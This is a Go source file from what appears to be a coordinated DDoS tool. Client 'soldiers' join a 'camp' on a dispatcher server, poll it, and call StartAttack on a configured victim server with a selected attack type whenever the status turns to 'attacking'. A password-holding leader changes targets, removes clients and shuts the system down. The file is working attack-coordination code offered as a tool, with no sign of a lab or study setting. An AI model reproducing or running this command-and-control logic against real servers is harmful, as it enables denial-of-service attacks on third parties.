package client

import (
	"bytes"
	"encoding/json"
	"errors"
	"fmt"
	"github.com/fatih/color"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
)

type Leader struct {
	Client
	Password string
}

type Client struct {
	http.Client      `json:"-"`
	Name             string `json:"name"`
	DispatcherServer string `json:"-"`
}

func (c *Client) GetCamp() CampAPI {
	//get request to dispatcher server /camp

	rq, err := http.NewRequest("GET", c.DispatcherServer+"/camp", nil)
	if err != nil {
		return CampAPI{}
	}
	do, err := c.Do(rq)
	defer do.Body.Close()

	if err != nil {
		var msg string
		_ = json.NewDecoder(do.Body).Decode(&msg)
		return CampAPI{}
	}
	var camp CampAPI
	err = json.NewDecoder(do.Body).Decode(&camp)
	if err != nil {
		return CampAPI{}
	}
	return camp
}

func (c *Client) JoinCamp() error {
	//post request to dispatcher server /camp/
	jr, err := json.Marshal(c)
	if err != nil {
		return err
	}
	rq, err := http.NewRequest("POST", c.DispatcherServer+"/camp", bytes.NewReader(jr))

	if err != nil {
		return err
	}
	do, err := c.Do(rq)

	if err != nil {
		return err
	}
	if do.StatusCode == http.StatusOK {
		return nil
	}
	fmt.Println(do.StatusCode)
	var msg string
	_ = json.NewDecoder(do.Body).Decode(&msg)
	return errors.New(msg)
}

func (l *Leader) RemoveFromCamp(password string) error {
	//delete request to dispatcher server /camp/
	//with body {name: c.Name}
	rq, err := http.NewRequest("DELETE", l.DispatcherServer+"/camp", nil)
	rq.Header.Add("Authorization", password)

	if err != nil {
		return err
	}
	do, err := l.Do(rq)
	defer do.Body.Close()
	if err != nil {
		return err
	}
	if do.StatusCode == http.StatusOK {
		return nil
	} else {
		//return the body as error message
		var msg string
		_ = json.NewDecoder(do.Body).Decode(&msg)
		return errors.New(msg)
	}
}

func (l *Leader) UpdateCampSettings(settings CampSettings) error {
	//put request to dispatcher server /camp/
	//convert settings to json and put it in the body
	jr, err := json.Marshal(settings)
	if err != nil {
		return err
	}

	rq, err := http.NewRequest("PUT", l.DispatcherServer+"/camp", bytes.NewReader(jr))
	if err != nil {
		return err
	}
	rq.Header.Add("Authorization", l.Password)

	do, err := l.Do(rq)
	defer do.Body.Close()
	if err != nil {
		return err
	}
	if do.StatusCode == http.StatusOK {
		return nil
	} else {
		var msg string
		_ = json.NewDecoder(do.Body).Decode(&msg)
		return errors.New(msg)
	}
}

func (c *Client) ListenAndDo(ChangedDataChan chan CampAPI, logChan chan string) {
	prevCmp := c.GetCamp()
	ChangedDataChan <- prevCmp
	stopchan := make(chan bool, 1)
	stopchan <- false

	var cmp CampAPI
	for {
		cmp = c.GetCamp()
		if !cmp.Equals(prevCmp) {
			select {
			case <-ChangedDataChan:
			default:
			}
			ChangedDataChan <- cmp
			if cmp.Settings.DDOSType != prevCmp.Settings.DDOSType {
				logChan <- "change attack mode " + cmp.Settings.DDOSType
			}
			if cmp.Settings.Status == "attacking" {
				go StartAttack(cmp.Settings.VictimServer, cmp.Settings.DDOSType, stopchan, logChan)
			}
			if cmp.Settings.VictimServer != prevCmp.Settings.VictimServer {
				logChan <- "Victim server changed to " + cmp.Settings.VictimServer
			}

			if cmp.Settings.Status == "stopped" {
				select {
				case <-stopchan:
				default:
				}
				stopchan <- true
			}
			prevCmp = cmp
			time.Sleep(2 * time.Second)
		}
	}
}

func (c *Client) Start() {
	err := c.JoinCamp()
	if err != nil {
		if strings.Contains(err.Error(), "connection refused") {
			color.Red("Dispatcher server is not running")
			return
		} else {
			color.Red(err.Error())
			return
		}
	}
	var ChangedDataChan = make(chan CampAPI, 1)
	logChan := make(chan string, 1)

	wg := sync.WaitGroup{}
	wg.Add(1)
	go func() {
		c.ListenAndDo(ChangedDataChan, logChan)
		wg.Done()
	}()

	go func() {
		StartSoldierView(ChangedDataChan, logChan)
		wg.Done()
	}()
	wg.Wait()
}
func (l *Leader) Shutdown() error {
	// delete request to /system
	rq, err := http.NewRequest("DELETE", l.DispatcherServer+"/system", nil)
	if err != nil {
		return err
	}
	rq.Header.Set("Authorization", l.Password)
	do, err := l.Do(rq)
	if err != nil {
		return err
	}
	if do.StatusCode == http.StatusOK {
		return nil
	}
	return errors.New("error in shutting down")
}
func (l *Leader) ListenChangeView(changedDataChan chan CampAPI) {
	prevCamp := l.GetCamp()
	changedDataChan <- prevCamp
	for {
		camp := l.GetCamp()
		if !camp.Equals(prevCamp) {
			select {
			case <-changedDataChan:
			default:
			}
			changedDataChan <- camp
		}
		time.Sleep(1 * time.Second)
	}
}
func (l *Leader) Start() {
	func() {
		defer func() {
			if r := recover(); r != nil {
				color.Red("Dispatcher server is not running")
				os.Exit(0)
			}
		}()
		err := l.Ping()
		if err != nil {
			panic(err)
		}
	}()

	var changedDataChan = make(chan CampAPI, 1)
	logChan := make(chan string, 10)
	wg := sync.WaitGroup{}
	wg.Add(1)

	go func() {
		l.ListenChangeView(changedDataChan)
		wg.Done()
	}()
	go func() {
		l.StartLeaderView(changedDataChan, logChan)
		wg.Done()
	}()
	wg.Wait()
}
func (c *Client) Ping() error {
	rq, err := http.NewRequest("GET", c.DispatcherServer+"/ping", nil)
	if err != nil {
		return err
	}
	do, err := c.Do(rq)
	if err != nil {
		return err
	}
	if do.StatusCode == http.StatusOK {
		return nil
	}
	return errors.New("error in pinging")
}
